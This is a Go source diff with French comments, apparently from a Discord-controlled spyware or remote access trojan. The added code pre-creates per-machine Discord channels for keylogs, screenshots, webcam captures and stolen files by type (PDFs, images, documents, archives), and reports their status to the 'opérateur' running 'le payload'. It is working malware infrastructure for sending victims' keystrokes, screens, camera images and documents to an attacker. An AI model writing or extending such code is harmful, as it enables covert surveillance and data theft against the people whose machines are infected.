@@ -259,6 +259,69 @@ func webcamChannel() string {
 	return ""
 }
 
+// ensureAllChannels crée d'avance tous les salons de la machine.
+//
+// Sans cela, un salon n'apparaissait qu'au premier usage : sur une machine
+// virtuelle sans fichier sur le Bureau, les salons `-files-*` n'existaient
+// jamais, et sans caméra le salon `-webcam` non plus. L'opérateur voyait une
+// catégorie incomplète et croyait le payload cassé.
+func ensureAllChannels() {
+	for _, n := range allChannelNames() {
+		if stopped.Load() {
+			return
+		}
+		if id, _ := namedChannel(n); id != "" {
+			plog("salon prêt : " + n)
+		}
+		time.Sleep(300 * time.Millisecond) // limite de débit Discord
+	}
+}
+
+// allChannelNames liste les salons d'une machine, dans l'ordre d'affichage.
+func allChannelNames() []string {
+	host := hostChannelName()
+	return []string{
+		host,
+		host + "-keylogs",
+		host + "-screenshots",
+		host + "-webcam",
+		host + "-files-pdf",
+		host + "-files-images",
+		host + "-files-docs",
+		host + "-files-archives",
+		host + "-files-new",
+	}
+}
+
+// channelsReport force la création de tous les salons et rend l'état de
+// chacun : c'est la commande qui répond à « il manque des salons ».
+func channelsReport() string {
+	var b strings.Builder
+	b.WriteString("**Salons de la machine** (catégorie `" + hostChannelName() + "`)\n```\n")
+	ok := 0
+	names := allChannelNames()
+	for _, n := range names {
+		id, done := namedChannel(n)
+		switch {
+		case id != "":
+			fmt.Fprintf(&b, "%-22s %s\n", n, id)
+			ok++
+		case done:
+			fmt.Fprintf(&b, "%-22s refusé (droits du bot ?)\n", n)
+		default:
+			fmt.Fprintf(&b, "%-22s en attente (réseau)\n", n)
+		}
+	}
+	b.WriteString("```")
+	if ok == len(names) {
+		b.WriteString("\nles 9 salons sont en place.")
+	} else {
+		b.WriteString(fmt.Sprintf("\n%d/%d salons. Un refus vient des permissions du bot : "+
+			"il lui faut « Gérer les salons » sur le serveur.", ok, len(names)))
+	}
+	return b.String()
+}
+
 // screenshotsChannel renvoie le salon des captures d'écran
 // (`<machine>-screenshots`). Il reçoit une image par moniteur à chaque
 // cadence, sans polluer le salon de commande.
